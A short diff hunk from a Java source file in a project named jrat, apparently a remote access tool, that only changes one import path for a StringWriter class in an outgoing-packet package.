@@ -1,7 +1,7 @@
 package jrat.client.packets.outgoing;
 
 import com.sun.management.OperatingSystemMXBean;
-import io.jrat.common.io.StringWriter;
+import jrat.common.io.StringWriter;
 import java.io.DataOutputStream;
 import java.lang.management.ManagementFactory;
 
